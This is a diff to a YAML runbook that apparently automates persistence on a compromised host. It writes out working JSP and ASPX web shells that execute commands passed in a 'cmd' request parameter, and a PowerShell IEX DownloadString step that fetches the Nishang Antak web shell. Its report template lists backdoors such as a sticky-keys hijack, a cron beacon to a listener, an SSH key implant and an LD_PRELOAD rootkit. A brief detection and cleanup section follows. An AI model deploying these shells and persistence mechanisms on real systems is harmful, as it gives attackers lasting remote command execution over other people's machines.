+    - '"shell=''''''<%@page import=\\\"java.io.*\\\"%><% Process p=Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\"));
+      BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
+      String l; while((l=br.readLine())!=null) out.println(l); %>''''''
+
+      open(''{case_dir}/shell.jsp'',''w'').write(shell)
+
+      print(''JSP web shell created'')"'
+    - -o
+    - '{case_dir}/webshell_jsp.txt'
+    timeout: 15
+    type: tool
+  - id: webshell_aspx
+    name: ASPX web shell
+    tool: python3
+    args:
+    - -c
+    - '"shell=''''''<%@ Page Language=\\\"C#\\\" %><% System.Diagnostics.Process p=new
+      System.Diagnostics.Process(); p.StartInfo.FileName=\\\"cmd.exe\\\"; p.StartInfo.Arguments=\\\"/c
+      \\\"+Request.QueryString[\\\"cmd\\\"]; p.StartInfo.UseShellExecute=false; p.StartInfo.RedirectStandardOutput=true;
+      p.Start(); Response.Write(p.StandardOutput.ReadToEnd()); %>''''''
+
+      open(''{case_dir}/shell.aspx'',''w'').write(shell)
+
+      print(''ASPX web shell created'')"'
+    - -o
+    - '{case_dir}/webshell_aspx.txt'
+    timeout: 15
+    type: tool
+  - id: webshell_nishang
+    name: Nishang web shell
+    tool: powershell
+    args:
+    - -Command
+    - IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Antak-WebShell/antak.aspx');
+      Out-File -FilePath '{case_dir}/antak.aspx' -InputObject $webpage
+    - -o
+    - '{case_dir}/webshell_nishang.txt'
+    timeout: 30
+    type: tool
+- id: detection
+  name: Persistence detection notes
+  type: sequential
+  steps:
+  - id: detection_guide
+    name: Detection & cleanup guide
+    tool: python3
+    args:
+    - -c
+    - '"print(''=== PERSISTENCE DETECTION & CLEANUP ==='')
+
+      print()
+
+      print(''Windows detection:'')
+
+      print(''  autorunsc -a -c C:\\Windows\\System32\\autorunsc64.exe'')
+
+      print(''  Get-WmiObject -Namespace root\\subscription -Class __FilterToConsumerBinding'')
+
+      print(''  schtasks /query /fo CSV /v'')
+
+      print(''  wmic startup list full'')
+
+      print()
+
+      print(''Linux detection:'')
+
+      print(''  auditd: ausearch --start today -k persistence'')
+
+      print(''  crontab -l && ls -la /etc/cron*'')
+
+      print(''  systemctl list-timers --all'')
+
+      print(''  cat /etc/ld.so.preload'')
+
+      print(''  cat ~/.ssh/authorized_keys'')
+
+      print()
+
+      print(''Cleanup:'')
+
+      print(''  Windows: reg delete, schtasks /delete, sc delete'')
+
+      print(''  Linux: remove cron, delete .ssh key, rm systemd unit'')
+
+      "'
+    - -o
+    - '{case_dir}/persistence_detection.txt'
+    timeout: 15
+    type: tool
+- id: report
+  name: Generate persistence report
+  type: report
+  format: markdown
+  title: Persistence Mechanisms — {target_host}
+  output: '{case_dir}/persistence-report.md'
+  sections:
+  - heading: Target
+    body: '- Host: {target_host}
+
+      - Listener: {listener_ip}:{listener_port}
+
+      - Case: {case_id}'
+  - heading: Windows Registry
+    body: '- HKCU Run: {case_dir}/registry_hkcu_run.txt
+
+      - HKLM Run: {case_dir}/registry_hklm_run.txt
+
+      - RunOnce: {case_dir}/registry_runonce.txt
+
+      - IFEO (sticky keys): {case_dir}/registry_ifeo_stickykeys.txt'
+  - heading: Windows Scheduled Tasks
+    body: '- SYSTEM task: {case_dir}/scheduled_task_system.txt
+
+      - Logon task: {case_dir}/scheduled_task_logon.txt'
+  - heading: Windows Services
+    body: '- New service: {case_dir}/persistent_service.txt
+
+      - Mod binpath: {case_dir}/service_binpath.txt
+
+      - Failure restart: {case_dir}/service_failure_persist.txt'
+  - heading: Windows WMI
+    body: '- Event subscription: {case_dir}/wmi_persistence.txt'
+  - heading: Windows Startup
+    body: '- LNK: {case_dir}/startup_lnk.txt'
+  - heading: Linux Cron
+    body: '- User: {case_dir}/linux_cron_user.txt
+
+      - System: {case_dir}/linux_cron_system.txt
+
+      - Beacon: {case_dir}/linux_cron_beacon.txt'
+  - heading: Linux Profile
+    body: '- .bashrc: {case_dir}/linux_bashrc.txt
+
+      - .profile: {case_dir}/linux_profile.txt
+
+      - SSH key: {case_dir}/linux_ssh_key.txt
+
+      - SSHD config: {case_dir}/linux_sshd_config.txt'
+  - heading: Linux Systemd
+    body: '- Service: {case_dir}/systemd_service.txt
+
+      - Timer: {case_dir}/systemd_timer.txt'
+  - heading: Linux LD_PRELOAD
+    body: '- LD_PRELOAD rootkit: {case_dir}/linux_ld_preload.txt'
+  - heading: Web Shells
+    body: '- PHP: {case_dir}/shell.php
+
+      - JSP: {case_dir}/shell.jsp
+
+      - ASPX: {case_dir}/shell.aspx
+
+      - Nishang: {case_dir}/webshell_nishang.txt'
+  - heading: Detection
+    body: '- Cleanup guide: {case_dir}/persistence_detection.txt'
 postflight:
-  - id: done
-    type: notify
-    level: warning
-    message: "Persistence runbook complete — {case_dir}"
+- id: done
+  type: notify
+  level: warning
+  message: Persistence runbook complete — {case_dir}
+  name: Done
